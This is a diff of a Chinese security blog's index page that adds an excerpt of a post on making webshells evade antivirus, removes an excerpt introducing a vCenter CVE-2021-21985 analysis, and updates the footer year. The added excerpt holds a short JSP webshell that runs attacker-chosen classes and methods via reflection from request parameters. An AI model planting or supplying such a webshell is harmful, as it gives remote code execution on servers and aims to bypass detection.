@@ -67,6 +67,59 @@
 
   
     
+    <h3 class="article-title"><a href="/2021/09/29/webshell免杀笔记/"><span>webshell免杀笔记</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/09/29/webshell免杀笔记/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-09-29T02:24:02.000Z">
+          2021-09-29
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="更改接收参数方式"><a href="#更改接收参数方式" class="headerlink" title="更改接收参数方式"></a>更改接收参数方式</h2><h3 id="调用的类和方法参数化-失败"><a href="#调用的类和方法参数化-失败" class="headerlink" title="调用的类和方法参数化(失败)"></a>调用的类和方法参数化(失败)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">	 String className = request.getParameter(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        Class  A = Class.forName(className);</span><br><span class="line">        Constructor B =  A.getDeclaredConstructor();</span><br><span class="line">        B.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Method M = A.getMethod(request.getParameter(<span class="string">&quot;b&quot;</span>), String.class);</span><br><span class="line">        String D = request.getParameter(<span class="string">&quot;c&quot;</span>);</span><br><span class="line">        M.invoke(B.newInstance(), D);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+        
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/webshell/">webshell</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
     <h3 class="article-title"><a href="/2021/09/24/负载均衡踩坑记/"><span>负载均衡踩坑记</span></a></h3>
     
   
@@ -552,60 +605,6 @@
 
 
 
-  <article>
-
-  
-    
-    <h3 class="article-title"><a href="/2021/06/07/Vcenter漏洞分析/"><span>Vcenter漏洞分析</span></a></h3>
-    
-  
-
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2021/06/07/Vcenter漏洞分析/" rel="bookmark">
-        <time class="entry-date published" datetime="2021-06-07T03:41:52.000Z">
-          2021-06-07
-        </time>
-      </a>
-    </span>
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
-      
-        <p>​        前阵子vcenter爆出了<code>CVE-2021-21985</code>漏洞，师傅们对这个漏洞提出了多种不同的利用方案，都非常的精彩，因此我搭建好了vcenter的环境，并对师傅们公开的利用方法进行了分析。</p>
-<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>​        本来打算通过OVA来安装，试了7.0和6.5的版本，由于各种坑试了两天都没搭建成功，最后无奈在windows下进行安装，需要注意的是在SSO设置域名时，如果是在内网搭建的没有域名，改一下本地的hosts文件随便给个域名就可以了，最终选择6.7的版本进行安装。</p>
-        
-      
-    </div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-      
-
-    <span class="post-categories">
-      <i class="icon-categories"></i>
-        <a href="/categories/漏洞分析/">漏洞分析</a>
-    </span>
-    
-
-    
-
-    </div>
-
-    
-  </div>
-</article>
-
-
-
 
 <nav class="pagination">
   
@@ -623,7 +622,7 @@
     Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
     </br>
     
-    &copy; 2021 藏青
+    &copy; 2022 藏青
     
   </p>
 </footer>
